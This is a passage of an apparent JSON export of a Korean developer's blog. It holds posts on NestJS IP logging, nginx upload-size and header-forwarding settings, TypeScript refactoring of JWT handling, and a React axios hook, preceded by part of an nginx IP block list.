#22-01-02\n  \t45.83.0.0/16 1; #log4j\n  \t51.159.0.0/16 1; #FR-21-11-17\n  \t137.184.0.0/16 1; #22-01-02\n  \t167.71.0.0/16 1; #US(NE)-21-11-25\n  \t185.220.0.0/16 1; #log4j\n\t20.119.0.0/16 1; #22-02-02\n\t92.223.0.0/16 1; #22-04-05\n\t46.101.0.0/16 1; #22-06-09\n\t163.172.0.0/16 1; #22-06-10\n\t198.235.0.0/16 1; #22-06-28\n\t5.62.0.0/16 1;\n\t178.62.0.0/16 1;\n\t146.70.0.0/16 1;\n\t14.116.0.0/16 1;\n\t144.168.0.0/16 1;\n\t144.126.0.0/16 1;\n\t143.198.0.0/16 1;\n\t128.199.0.0/16 1;\n\t18.118.0.0/16 1;\n\t18.234.0.0/16 1;\n\t159.65.0.0/16 1;\n\t159.65.0.0/16 1;\n\t34.240.0.0/16 1;\n\t157.245.0.0/16 1;\n\t170.247.0.0/16 1;\n\t159.223.0.0/16 1;\n\t165.232.0.0/16 1;\n\t168.119.0.0/16 1;\n\t188.166.0.0/16 1;\n\t198.244.0.0/16 1;\n\t35.86.0.0/16 1;\n\t35.89.0.0/16 1;\n\t106.75.0.0/16 1;\n\t205.185.0.0/16 1;\n\t209.141.0.0/16 1;\n\t209.127.0.0/16 1;\n\t43.130.0.0/16 1;\n\t35.93.0.0/16 1;\n\n  \t# C\n  \t77.111.247.0/24 1; #NO-21-12-16\n  \t167.172.62.0/24 1; #22-01-02\n  \t171.25.193.0/24 1; #log4j\n\t92.118.160.0/24 1; #22-04-10\n\t220.181.51.0/24 1; #22-04-12\n\t95.142.120.0/24 1; #22-04-25\n\t5.188.62.0/24 1; #22-05-10\n\t116.179.33.0/24 1; #22-06-10\n\n\t92.223.85.0/24 1;\n\t93.158.91.0/24 1;\n\t93.158.90.0/24 1;\n\t36.99.136.0/24 1;\n\t111.7.100.0/24 1;\n\t117.187.173.0/24 1;\n\t156.146.35.0/24 1;\n\t185.54.229.0/24 1;\n\t185.27.99.0/24 1;\n\t185.181.60.0/24 1;\n\t198.235.24.0/24 1;\n\t205.169.39.0/24 1;\n\t205.210.31.0/24 1;\n\t208.80.194.0/24 1;\n\t111.7.100.0/24 1;\n\t205.210.31.0/24 1;\n\t51.222.253.0/24 1;\n\t89.187.163.0/24 1;\n\t95.142.120.0/24 1;\n\t42.83.147.0/24 1;\n\t54.36.148.0/24 1;\n\t64.43.117.0/24 1;\n\t191.102.179.0/24 1;\n\t199.244.88.0/24 1;\n\n  \tdefault 0;\n}\n```\n\n```toc\n\n```\n"},{"excerpt":"배포를 하기 전에... 흑우집합소 테섭에 배포를 하고나서 몇 가지 테스트를 진행하던 도중 pm2 로그를 잠시 확인했다.  저기 보면 clientIp라고 되어 있는 곳에 IP가 뜨는데 뭔가 좀 이상했다... IpV4가 나와야 하는데 IpV6 형식으로 나왔다. 사실 큰 상관은 없을 것 같은데 그래도 서버 내에서 로깅이나 확인할 때 IpV6 형식으로 되어 있다…","fields":{"slug":"/nest_js/230401_ipv6_ipv4/"},"frontmatter":{"date":"April 01, 2023","title":"Nest.js에서 Ip 조회할 때 IpV6로 표시되는 것을 IpV4로 바꾸기","description":null,"tags":["NestJs"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n# 배포를 하기 전에...\n\n[흑우집합소](https://bcow.world) 테섭에 배포를 하고나서 몇 가지 테스트를 진행하던 도중 pm2 로그를 잠시 확인했다.\n\n![](/img01.png)\n\n저기 보면 clientIp라고 되어 있는 곳에 IP가 뜨는데 뭔가 좀 이상했다...  \nIpV4가 나와야 하는데 IpV6 형식으로 나왔다.\n\n사실 큰 상관은 없을 것 같은데 그래도 서버 내에서 로깅이나 확인할 때 IpV6 형식으로 되어 있다면 불편할 것 같았다.  \n그래서 이걸 V4 형식으로 바꿨다.\n\n방법은 여러가지가 있지만, 제일 쉽고 아무것도 설치하지 않아도 되는 방식으로 했다.\n\n```typescript\nasync function bootstrap() {\n  const app = await NestFactory.create(AppModule, { bodyParser: true })\n\n  //Some init\n\n  await app.listen(4000, \"0.0.0.0\")\n  console.log(new Date(), \"[SERVER-ON] = \", process.env.NODE_ENV)\n}\n```\n\n저렇게 **app.listen**함수 뒤에 전달인자로 **hostname**을 전달해주면 된다.  \n저 함수를 타보면 아래와 같은 형태이다.\n\n```typescript\n/**\n     * Starts the application.\n     *\n     * @param {number|string} port\n     * @param {string} [hostname]\n     * @param {Function} [callback] Optional callback\n     * @returns {Promise} A Promise that, when resolved, is a reference to the underlying HttpServer.\n     */\n    listen(port: number | string, callback?: () => void): Promise<any>;\n    listen(port: number | string, hostname: string, callback?: () => void): Promise<any>;\n```\n\n저 hostname에 ipv4 형식을 문자열로 전달하면 이제 Nest.Js 내에서 ip 주소 표현은 IpV4로 바뀌게 된다.\n"},{"excerpt":"파일 업로드를 했는데... 흑우집합소를 개발하고, 로컬에서 잘 되던 파일 업로드 기능이 이상하게 배포만 하면 에러가 났다. -_-;; Nest.Js의 서버측에서는 파일 사이즈를 분명 설정하고 잘 맞춰뒀는데 왜 그런 에러가 발생하는지 이유가 궁금했다...  에러는 복잡했는데 Status코드가 413이 돌아왔다. 이 에러 코드는 클라이언트에서 보낸 요청의 크…","fields":{"slug":"/nginx/230331_file_upload_size/"},"frontmatter":{"date":"March 31, 2023","title":"Nginx에서 파일 업로드 사이즈 용량 처리","description":null,"tags":["Nginx"],"series":"Nginx","previewImage":"nginx_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nginx.jpg)\n\n# 파일 업로드를 했는데...\n\n흑우집합소를 개발하고, 로컬에서 잘 되던 파일 업로드 기능이 이상하게 배포만 하면 에러가 났다. -\\_-;;  \nNest.Js의 서버측에서는 파일 사이즈를 분명 설정하고 잘 맞춰뒀는데 왜 그런 에러가 발생하는지 이유가 궁금했다...\n\n![](/img01.png)\n\n에러는 복잡했는데 Status코드가 **413**이 돌아왔다.\n\n이 에러 코드는 클라이언트에서 보낸 요청의 크기가 서버에서 설정한 최대 한도를 초과해서 발생하는 문제다.  \n근데 서버는 분명 설정을 해뒀으니 누가 문제일까?\n\n역시 범인은 Nginx였다.\n\n## 처리방법은?\n\n몹시 간단하다.  \nNginx의 설정 값 중 **client_max_body_size** 값을 지정해주면 된다. **(마크다운 문법 에러 때문에 \\_ 조심)**\n\n### client_max_body_size 설정하기\n\nnginx의 설치된 경로에 별도로 바꾸지 않았다면, **nginx.conf**파일을 열고 아래와 같이 값을 입력해준다.\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nhttp {\n\n\t##\n\t# Basic Settings\n\t##\n\n\tsendfile on;\n\ttcp_nopush on;\n\ttypes_hash_max_size 2048;\n\tclient_max_body_size 100m; # 이 부분처럼 설정해주고 용량을 적당하게 지정하자.\n\n    ....\n}\n```\n\n이렇게 처리하면 잘 될 것이다.  \n만약 위에 client_max_body_size 옵션 만으로도 에러가 지속되면 버퍼쪽도 올려줘야 한다.\n\n### proxy_buffer_size와 proxy_buffers 설정하기\n\n참고로 Nginx는 기본 버퍼가 16KB다.  \n그래서 이 부분을 더 늘려서 사용하면 된다.\n\n이것도 위에 나온 경로에 아까 설정한 client_max_body_size 값 바로 아래에 정해준다.\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nhttp {\n\n\t##\n\t# Basic Settings\n\t##\n\n\tsendfile on;\n\ttcp_nopush on;\n\ttypes_hash_max_size 2048;\n\tclient_max_body_size 100m;\n    proxy_buffer_size   64k; # 버퍼 설정 64KB\n    proxy_buffers   4 64k; # 버퍼 설정 64KB\n\n    ....\n}\n```\n\n## 정리\n\n**마크다운 버그인지 저기 속성들이 \\_(언더바)가 들어가는데 2개 이상 쓰면 저렇게 글이 뭉개진다.**  \n**그래서 저 옵션은 꼭 잘 확인하자.**\n\n이렇게 처리한다면 더 이상 413이니 이상한 에러는 안날 것이다.  \n물론 백엔드 코드가 잘못되어 있다면 에러는 발생하겠지만...\n\nPS : 하다보니 Nginx가 범인이 아니라 무지한 내가 범인인듯....\n\n```toc\n\n```\n"},{"excerpt":"개발하며 얻은 TIL 흑우집합소 개발하며 얻은 내용 및 노션에 작성한 내용을 정리한 포스팅이다. 오늘 개발하면서 배운 내용은 아래와 같다. 예외처리의 미흡함 (예외처리 부분) 문자열 상수(String Literal) - Typescript Object 키 문제 반복적 코드를 줄이는 리팩토링 각 항목은 아래의 내용을 참고하자. 1. 예외처리 부분 오늘도 개…","fields":{"slug":"/til/230324_til/"},"frontmatter":{"date":"March 31, 2023","title":"23년 3월 24일 TIL & 개발노트 (Typescript에서 문자열 상수, 그리고 코드 리팩토링)","description":null,"tags":null,"series":null,"previewImage":null,"isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n<br><br><br><br>\n\n# 개발하며 얻은 TIL\n\n흑우집합소 개발하며 얻은 내용 및 노션에 작성한 내용을 정리한 포스팅이다.  \n오늘 개발하면서 배운 내용은 아래와 같다.\n\n1. 예외처리의 미흡함 (예외처리 부분)\n2. 문자열 상수(String Literal) - Typescript Object 키 문제\n3. 반복적 코드를 줄이는 리팩토링\n\n각 항목은 아래의 내용을 참고하자.\n\n## 1. 예외처리 부분\n\n오늘도 개발을 하던 도중 코드가 이상한 부분을 찾게 되었다.  \n백엔드 측의 에러 핸들링 부분이었다.\n\n```typescript\nif (exception instanceof AuthException) {\n  //토큰 문제가 발생한 경우\n  if (\n    exception.errorCode === '8-1' ||\n    exception.errorCode === '8-2' ||\n    exception.errorCode === '8-3' ||\n    exception.errorCode === '8-4' ||\n    exception.errorCode === '8-5'\n  ) {\n    const decodeData = this.decodeJwtOutboundPort.accessJwtDecode(request.header(HEADER_JWT));\n    //로그아웃 처리\n    await this.logoutAccountInboundPort.excute({\n      email: decodeData.email,\n      joinType: decodeData.joinType,\n    });\n    response.setHeader(HEADER_JWT, '');\n  }\n}\n```\n\nError Handler 부분의 일부다.  \n여기서 저기 **const decodeData** 부분의 로직을 보면 request의 헤더로부터 jwt를 가져오는 부분이 있다.\n\n만약 헤더에 jwt를 안가지고 올 경우 어떻게 될까?  \n또 버그를 양산하는 모양새가 된다.\n\n물론 **jwtStrategy**에서 검증을 하겠지만, 혹시 **AuthExceptionHandler**를 strategy 없이 사용하는 곳에서 발생했다면?  \n그래서 이 부분은 검사를 한번 더 하는 방향으로 로직을 수정했다.\n\n```typescript\nif (exception instanceof AuthException) {\n  //토큰 문제가 발생한 경우\n  if (\n    exception.errorCode === '8-1' ||\n    exception.errorCode === '8-2' ||\n    exception.errorCode === '8-3' ||\n    exception.errorCode === '8-4' ||\n    exception.errorCode === '8-5'\n  ) {\n    //만약 JWT가 헤더 안에 있다면...\n    if (request.header(HEADER_JWT)) {\n      const decodeData = this.decodeJwtOutboundPort.accessJwtDecode(request.header(HEADER_JWT));\n      //로그아웃 처리\n      await this.logoutAccountInboundPort.excute({\n        email: decodeData.email,\n        joinType: decodeData.joinType,\n      });\n    }\n\n    response.setHeader(HEADER_JWT, '');\n  }\n}\n```\n\n이렇게 한번 보호를 함으로써 예외를 막을 수 있었다.\n\n## 2. Typescript Object 키 문제\n\n개발을 하던 도중 아래와 같은 코드를 작성했다.\n\n```typescript\nconst F_HEADER_BKEY = 'test_key' as const;\nconst defaultH: { [key: string]: string } = {\n  'key-str': 'value-str',\n  'F_HEADER_BKEY': '111aaa',\n};\n\nconsole.log('show value = ', defaultH);\n```\n\n이렇게 작성할 경우 결과는 아래와 같아 나온다.\n\n```\n[LOG]: \"show value = \",  {\n  \"key-str\": \"value-str\",\n  \"F_HEADER_BKEY\": \"111aaa\"\n}\n```\n\n내가 원하는 그림은 **F-HEADER_BKEY**의 값이 저 상수 이름 값이 아닌,  \n**test_key** 상수의 값이 들어가길 원했다.\n\n이 문제를 해결하려면 아래와 같이 작성한다.\n\n```typescript\nconst F_HEADER_BKEY = 'test_key' as const\nconst defaultH: { [key: string]: string } = {\n  'key-str': 'value-str',\n}\n\ndefaultH[F_HEADER_BKEY] = \"aaa\"\n\n//결과\n\n[LOG]: \"show value = \",  {\n  \"key-str\": \"value-str\",\n  \"test_key\": \"aaa\"\n}\n```\n\n맨 처음처럼 나타나는 이유는 내가 선언한 **defaultH**의 경우,  \n타입이 다음과 같이 **{ [key: string]: string }** 되어 있다.\n\n즉 key는 string으로 되어 있기에 string 자체로 인식을 해버린다.  \n하지만 두 번째 제대로 나오는 부분에서는 Object형에 접근하기 위한 값으로 사용한 것이,  \n문자열(string)이 아닌 **상수 문자열(string literal)**를 사용했기에 적용이 된다.\n\n그리고 하나 더 찝어서 이야기 하면 아래와 같은 코드도 동작이 안될 것이다.\n\n```typescript\ndefaultH.F_HEADER_BKEY = \"aaa\"\n\n//결과\n[LOG]: \"show value = \",  {\n  \"key-str\": \"value-str\",\n  \"test_key\": \"aaa\",\n  \"F_HEADER_BKEY\": \"a111\"\n}\n```\n\n이거는 간단한 것이 object에 .(Dot)으로 접근 시 해당 키를 이용해 접근하는 방식이다.  \n하지만 여기도 **F-HEADER_BKEY**를 문자열 자체로 받아들인다.\n\n이게 문자열 상수 값으로 받아들여지지 않고, 그냥 문자열 자체로 받아들인단 의미다.  \n그래서 혹시 선언된 객체형에 키를 동적으로 쓰고 싶다면 **[]** 형식을 이용해서 접근하는게 좋다.\n\n## 3. 반복적 코드를 줄이는 리팩토링\n\n백엔드 측을 개발하면서 다음과 같은 코드가 있었다.  \n(아래 코드는 예시를 위해 사용하여 일부 변수 및 내용이 코드 문법에 어긋날 수 있습니다.)\n\n```typescript\n@Injectable()\nexport class JwtStrategy extends PassportStrategy(Strategy, 'Jwt') {\n  constructor(\n    @Inject(VERIFY_JWT_OUTBOUND_PORT)\n    private readonly verifyjwtOutboundPort: VerifyJwtOutboundPort,\n    @Inject(DECODE_JWT_OUTBOUND_PORT)\n    private readonly decodJwtOutboundPort: DecodeJwtOutboundPort,\n    @Inject(CREATE_JWT_OUTBOUND_PORT)\n    private readonly createJwtOutboundPort: CreateJwtOutboundPort,\n    @Inject(FIND_ACCOUNT_EMAIL_JOINTYPE_STATUS_OUTBOUND_PORT)\n    private readonly findAccountEmailJoinTypeOutboundPort: FindAccountEmainJoinTypeStatusOutboundPort,\n    @Inject(LOGOUT_ACCOUNT_INBOUND_PORT)\n    private readonly logoutAccountInboundPort: LogoutAccountInboundPort,\n  ) {\n    super();\n  }\n\n  async validate(req: Request<ParamsDictionary, any, any, ParsedQs, Record<string, any>>, options?: any) {\n    const res = req.res;\n    const jwt = req.header(HEADER_JWT);\n\n    /**\n     * JWT가 존재하지 않는 경우 에러 처리\n     */\n    if (!jwt) {\n      throw new AuthException(AuthJwtErrorCode.jwtNotFound());\n    }\n\n    const account: Account = await this.getAccountInJwt(jwt, JWT_TYPE.ACCESS_TOKEN);\n    //...Some work\n  }\n\n  //JWT 내에서 계정 정보를 가져오는 함수\n  private async getAccountInJwt(jwt: string, tokenType: JwtType): Promise<Account> {\n    //Access가 만료된 경우 리프레시 토큰도 체크해줘야 한다.\n    const jwtData = this.decodJwtOutboundPort.accessJwtDecode(jwt);\n\n    //계정 정보를 가져온다.\n    return await this.findAccountEmailJoinTypeOutboundPort.excute({\n      u_email: jwtData.email,\n      ua_joinType: jwtData.joinType,\n      uStatus: ACCOUNT_STATUS_TYPE.ACTIVE,\n      uAccAuth: jwtData.auth,\n    });\n  }\n}\n```\n\n근데 코드를 작성하다보니...**getAccountInJwt** 함수의 경우 다른 곳에서도 비슷한 방식으로 사용되고 있었다.  \n쉽게말해 중복적으로 코드가 작성되고 있었다.\n\n이 부분은 **Inbound Port** 성향의 서비스 로직으로 분리할 수 있었다.  \n난 **Port & Adaptor** 아키텍쳐 방식을 사용할 때 In과 Out을 저번에 받은 강의 내요을 토대로 사용한다.\n\nIn 성향은 외부 세계에서 요청이 오는 경우로 나누고,  \nOut은 백엔드 내에서 처리하여 인프라 쪽과 연계되는 경우로 나눈다.\n\n지금처럼 Jwt를 받아서 그 안에 담겨있는 정보를 요청해야 하는 경우,  \n이 성향은 Inbound 성향이라 할 수 있다.\n\n설령 내부에서 호출한다 해도 jwt라는 속성 자체가 외부에서 오기 때문이다.  \n물론 인프라 측의 DB 로직을 한번 타긴 하는데, 난 이런 경우 처음 접근하는 변수를 기준으로 잡는다.\n\n그래서 이 부분은 **Inbound Port**로 만들었다.\n\n```typescript\n//Inbound Port 정의\nimport { JwtType } from 'src/domain/auth/types/jwt.enums';\n\nexport const GET_ACCOUNT_IN_JWT_INBOUND_PORT = 'Get_Account_In_Jwt_Inbound_Port' as const;\n\nexport type GetAccountInJwtInputDto = {\n  jwt: string;\n  jwtType: JwtType;\n};\nexport type GetAccountInJwtOutputDto = {};\n\nexport interface GetAccountInJwtInboundPort {\n  excute(params: GetAccountInJwtInputDto);\n}\n\n//인바운드 인터페이스 구현체 서비스\nexport class GetAccountInJwtService implements GetAccountInJwtInboundPort {\n  constructor(\n    @Inject(DECODE_JWT_OUTBOUND_PORT)\n    private readonly decodJwtOutboundPort: DecodeJwtOutboundPort,\n    @Inject(FIND_ACCOUNT_EMAIL_JOINTYPE_STATUS_OUTBOUND_PORT)\n    private readonly findAccountEmailJoinTypeOutboundPort: FindAccountEmainJoinTypeStatusOutboundPort,\n  ) {}\n\n  async excute(params: GetAccountInJwtInputDto) {\n    //Access가 만료된 경우 리프레시 토큰도 체크해줘야 한다.\n    const jwtData = this.decodJwtOutboundPort.accessJwtDecode(params.jwt);\n\n    //계정 정보를 가져온다.\n    return await this.findAccountEmailJoinTypeOutboundPort.excute({\n      u_email: jwtData.email,\n      ua_joinType: jwtData.joinType,\n      uStatus: ACCOUNT_STATUS_TYPE.ACTIVE,\n      uAccAuth: jwtData.auth,\n    });\n  }\n}\n```\n\n<br>\n\n위와 같이 별도 Inbound Service로 분리할 경우 아래와 같이 간단하게 작성할 수 있었다.\n\n```typescript\nconstructor(@Inject()) {} //여기서 아래의 getAccountInJwtService 인터페이스 주입을 해준다.\n\n//Get Account\nconst account: Account = await this.getAccountInJwtService.excute({ jwt, jwtType: JWT_TYPE.ACCESS_TOKEN });\n\n//기존 코드\n//const account: Account = await this.getAccountInJwt(jwt, JWT_TYPE.ACCESS_TOKEN);\n```\n\n<br>\n\n이렇게 함으로써 다른 영역에서도 해당 로직을 재사용할 수 있게 되었다.\n\n## 정리\n\n개발을 하면서 계속 더 나은 코드를 작성하는 건 뭐랄까...  \n완벽할 수 없지만, 완벽에 가까워지도록 하는 형태가 된다고 해야 할까?\n\n그런 의미로 리팩토링은 참 재미있는 것 같다.\n\n```toc\n\n```\n"},{"excerpt":"분명 로컬에서는 잘 되었는데... 흑우집합소 개발이 다 되서 프로덕션 환경에서 배포 후 처리를 하는데 로그인 부분이 제대로 되지 않았다. 왜 그런가 콘솔 로그까지 찍어가며 확인해본 결과 헤더의 특정 값이 전달되지 않았다. 그래서 찾아보니... Nginx는 기본 헤더나 잘 알려진 기본 헤더 값만 전송한다고 한다. 기본 Http 헤더는 모질라 개발 문서를 참…","fields":{"slug":"/nginx/230330_nginx_header/"},"frontmatter":{"date":"March 30, 2023","title":"Nginx에서 헤더 전달하기 (프록시 사용)","description":null,"tags":["Nginx"],"series":"Nginx","previewImage":"nginx_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nginx.jpg)\n\n# 분명 로컬에서는 잘 되었는데...\n\n흑우집합소 개발이 다 되서 프로덕션 환경에서 배포 후 처리를 하는데 로그인 부분이 제대로 되지 않았다.  \n왜 그런가 콘솔 로그까지 찍어가며 확인해본 결과 헤더의 특정 값이 전달되지 않았다.\n\n그래서 찾아보니...  \nNginx는 기본 헤더나 잘 알려진 기본 헤더 값만 전송한다고 한다.\n\n기본 Http 헤더는 [모질라 개발 문서](https://developer.mozilla.org/ko/docs/Web/HTTP/Headers)를 참고하자.  \n무튼 어떻게 해야 하나 방법을 찾아보니 의외로 간단했다.\n\n## How to?\n\n참고로 난 Http로 오면 https로 포워딩하고, 내부 프론트엔드를 바라보게 되어있다.  \n그리고 설정은 다 못까지만 일부는 오픈한다.  \n또한 Ubuntu 환경에서 진행한다.\n\n먼저 정답을 이야기 하면 두 가지 옵션을 넣으면 된다.  \n**underscores_in_headers** 와 **proxy_pass_request_headers** 옵션이다.\n\n설명을 이어나가면...  \n**nginx.conf** 또는 자신의 별도 설정 파일에서 포워딩하는 부분을 찾는다.\n\n아래는 80에서 443으로 포워딩하는 부분이다.  \n여기는 설정할게 없다.\n\n다음은 https쪽이다.\n\n```\n### 443 (Https)\nserver {\n  #기본 설정\n  listen 443;\n  listen [::]:443;\n  root /var/www/html;\n\n  server_name bcow.world;\n\n  underscores_in_headers on; #언더스코어 형식 헤더 허용\n  location / {\n    proxy_set_header Range $saferange;\n\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header Host $http_host;\n    proxy_set_header X-Forwarded-Proto $scheme;\n    proxy_set_header X-NginX-Proxy true;\n\n    proxy_pass http://localhost:68742;\n    proxy_pass_request_headers on; #리퀘스트로 온 헤더를 프록시로 전달\n  }\n}\n```\n\n저기 주석에 나온 것처럼 하면 된다.  \n헤더에 난 \\_(언더스코어)를 써서 보내는 것들이 있어서 저 옵션도 넣었다.\n\n이렇게 하니까 해결이 되었다.\n\n## 정리\n\n내가 두 서비스를 배포하면서 느낀게 있다.  \n로컬에서는 잘 되는데 배포를 하면 안되는 경우, 변경된 개발환경을 살펴봐라.\n\n그 변경된 개발환경이 나의 경우 nginx밖에 없었기에 이 부분이 정답이었다.  \n왜 안되지라고 시간 많이 먹을 뻔 했다...\n\n```toc\n\n```\n"},{"excerpt":"흑우집합소 개발을 하며... PS : 아래 예제에서 호출되는 url은 참고용입니다 개발이 거의 끝나가는 무렵이었다. 사실 막 짠 코드가 좀 있었고... 로직이 좀 엉상한 부분도 있었다. 그래서 미래에 또 헤매거나 복잡함을 피하기 위해 찌금 작업을 좀 해두자 라는 마인드로... 일부 리팩토링을 진행했다. 1. 똥이 되어가는 코드를 코드 리팩토링 프론트엔드 …","fields":{"slug":"/til/230329_til/"},"frontmatter":{"date":"March 30, 2023","title":"23년 3월 29일 TIL & 개발노트 (코드 리팩토링, 배포환경)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 흑우집합소 개발을 하며...\n\n> PS : 아래 예제에서 호출되는 url은 참고용입니다\n\n<br>\n\n개발이 거의 끝나가는 무렵이었다.  \n사실 막 짠 코드가 좀 있었고...\n\n로직이 좀 엉상한 부분도 있었다.  \n그래서 미래에 또 헤매거나 복잡함을 피하기 위해 찌금 작업을 좀 해두자 라는 마인드로...  \n일부 리팩토링을 진행했다.\n\n## 1. 똥이 되어가는 코드를 코드 리팩토링\n\n프론트엔드 영역에서 Axios를 호출하는 부분에 대한 고민이 깊어졌다.\n\n```typescript\nawait excuteAxiosInbound({\n  inboundRequestConfig: {\n    url: \"/api/test/some/url\",\n    data: { url: \"acc/logout\", method: \"post\" },\n  },\n})\n  .finally(() => {\n    setLoading(false)\n  })\n  .then(responseData => {\n    //로그이웃 처리 및 기타 작업 ing~\n    router.push(\"/gogo/somewhere\")\n  })\n  .catch(e => {\n    axiosClientErrorHandler({ axiosError: e })\n  })\n```\n\n이렇게 되어 있다.  \n물론 전체 코드는 아니고 호출되는 영역만 가져왔다.\n\n근데 이걸 매번 호출할 때마다 반복적으로 작성해야 하는 부분이 마음에 안들었다.  \n지금 호출 로직은 아래의 세 가지 문제점이 발생한다.\n\n<b>\n\n> 1. 저 호출 부분에서 성공 시 또는 실패 시 처리해야 할 공통 로직이 추가된다면 일일히 바꿔야 하는 문제가 생긴다.\n> 2. setLoading과 같은 상태 관리(Zustant)의 로직을 호출 컴포넌트마다 작성해야 한다.\n> 3. 매번 인바운드(내부 api 주소로 호출하는 영역) 부분의 주소를 적거나 아웃바운드(백엔드 쪽)로 내보내야 하는 부분이 겹칠 때가 있다.\n\n</b>\n\n<br>\n\n이런 문제로 인해 저 부분을 공통 로직으로 만들어 쓰기로 하고...  \n이를 해결하기 위해 몇 가지 고민을 했다.\n\n<b>\n\n> 1. then 성공 로직에서 성공 시 공통으로 처리할 함수를 적어주기 (예외 발생시 처럼)\n> 2. excuteAxiosInbound 함수 자체를 전달인자로 바꾸기\n> 3. inbound로 나가는 axios를 개선\n\n</b>\n\n<br>\n\n해결법에서 1번은 사실 좋은 선택은 아니었다.  \n만들어갈 결과물에 포함될 방법일 뿐 그 자체만으로는 해결이 되지 않는다.\n\n2번은 생각해보니 성공 실패 로직에 대한 것을 호출 영역에서 함수로 전달하면 될 것 같다는 생각이 들었다.  \n3번은 지금도 되어 있긴 한데 문제 2번의 스토어를 넣어서 같이 사용하는 방향으로 하면 좋을 것 같았다.\n\n그래서 해결을 위해 호출하는 공통 로직을 Custom Hook으로 만들어야 했다.\n\n```typescript\nimport { useCallback } from \"react\"\nimport { SweetAlertOptions } from \"sweetalert2\"\nimport { SendAxiosRequestConfig } from \"../lib/axios/axios.type\"\nimport { excuteAxiosInbound } from \"../lib/axios/axios.util\"\nimport { axiosClientErrorHandler } from \"../lib/axios/errors/axios.client.error.handler\"\nimport useSetAccountInfo from \"./stores/use.account.info\"\nimport useLoading from \"./stores/use.loading\"\n\nexport interface AxiosCallClientHandlerInputDto {\n  outboundData: SendAxiosRequestConfig\n  successAction: Function\n  failSwal: SweetAlertOptions\n  setLoadingAction?: Function\n  outboundHeader?: { [key: string]: string } //Outbound로 헤더 보낼 때 쓰는 속성\n  inboundUrl?: string //inbound 호출 URL이 다른 경우 별도 작성 (Default = api/hub)\n}\n\n/**\n * Axis 내부 호출 Hook\n * @returns\n */\nexport function useAxiosInbound() {\n  const { handleSetLoading } = useLoading()\n  const { handleLogoutAccountInfo } = useSetAccountInfo()\n\n  //변수 선언\n  const axiosCallClientHandler = async (\n    params: AxiosCallClientHandlerInputDto\n  ) => {\n    //로딩\n    handleSetLoading(true)\n\n    await excuteAxiosInbound({\n      inboundRequestConfig: {\n        url: params?.inboundUrl\n          ? params.inboundUrl\n          : \"/use_api/back/inbound/axios\",\n        data: params.outboundData,\n      },\n      outboundHeader: params.outboundHeader,\n    })\n      .finally(() => {\n        handleSetLoading(false)\n      })\n      .then(responseData => {\n        params.successAction(responseData)\n      })\n      .catch(e => {\n        axiosClientErrorHandler({\n          axiosError: e,\n          handleLogoutAccountInfo,\n          failSwal: params.failSwal,\n        })\n      })\n  }\n\n  //메모제이션을 해준다.\n  const handleExcuteAxiosInbound = useCallback(\n    (params: AxiosCallClientHandlerInputDto) => {\n      axiosCallClientHandler(params)\n    },\n    [axiosCallClientHandler]\n  )\n\n  return { handleExcuteAxiosInbound }\n}\n```\n\n<br>\n\n이 Hook은 **handleExcuteAxiosInbound**라는 함수를 반환하는데 여기에 호출할 inputDto인 **AxiosCallClientHandlerInputDto**를 전달하면 된다.  \n그래서 호출할 컴포넌트에서는 아래와 같이 간단하게 호출할 수 있었다.\n\n그리고 **useCallback**을 이용해 재사용성을 하게 했다.\n\n```typescript\ninterface PagingProps {\n  //....\n}\n\nexport default function PagingComponent(props: PagingProps) {\n  //some logic..\n\n  const { handleExcuteAxiosInbound } = useAxiosInbound()\n\n  const handle4PageChange = async (page: number) => {\n    handleExcuteAxiosInbound({\n      outboundData: {\n        url: \"some/page/data/list?page=\" + page + \"&pnum=10\",\n        method: \"get\",\n      },\n      successAction: (responseData: any) => {\n        clearDataList()\n        const listData = responseData.data.result.resultData\n        setDataList(listData.dataList)\n\n        //페이지 데이터\n        const pageData = listData.pageData\n\n        setNowPage(pageData.nowPage)\n        setTotalItemCnt(pageData.totalItemCnt)\n        setTotalPage(pageData.totalPage)\n        setPerPageNum(pageData.perPageNum)\n      },\n      failSwal: {\n        title: \"데이터 로드 실패\",\n        html: \"페이지 데이터 로드에 실패하였습니다. <br> 관리자에게 문의해 주세요.\",\n        icon: \"error\",\n        confirmButtonText: \"확인\",\n      },\n    })\n  }\n  return <></>\n}\n```\n\n<br>\n\n개선된 코드는 간단 명료하다.  \naxios를 사용할 곳에 **useAxiosInbound()**라는 hook을 호출하여 실제 Axios 작업을 하는 함수를 불러온다.\n\n성공은 호출되는 영역마다 작업이 상이해서 저렇게 함수를 전달하지만,  \n실패는 언제나 지정된 양식이 있기에 공통으로 처리하고, 그 이외 예외는 알럿을 호출할 수 있게 해줬다.\n\n저 inputDto 자체는 재사용이 안되고, 호출 지점마다 고유해서 이 정도만 해도 많이 개선이 되었다고 판단했다.\n\n## 2. 배포만 하면 문제...\n\n이제는 몇 가지 테스트를 위해 배포를 해봤는데 자꾸 몇 가지 기능이 정상적으로 동작하지 않았다.  \n로그인 부분과 이중 로그인 영역 쪽이었다.\n\n그래서 20분 고민하다가...  \n내 로컬과 배포 환경과의 차이점이 뭘까?\n\n<b>\n\n> 1. pm2 구동환경\n> 2. 방화벽\n> 3. nginx\n> 4. aws와 Cloudflare의 환경\n\n</b>\n\n그래서 각 부분을 하나씩 점검했다.  \n1번의 경우 문제는 아니었다.  \n어짜피 구동하는건 로컬이나 pm2로 올리나 똑같으니까?\n\n2번 방화벽도 재점검 했는데 문제는 아니었다.  \n백엔드는 지정된 ip와 서버 내, 그리고 nginx에서 제대로 프록싱 하고 있었다.\n\n3번...이 정답이었다.  \nNginx는 기본적으로 헤더를 알려진 값 외에는 막는다.\n\n그래서 내가 커스텀으로 사용한 헤더가 정상적으로 전달이 되지 않은 문제가 답이었다.  \n이와 관련된 내용은 [Nginx에서 헤더 전달하기 (프록시 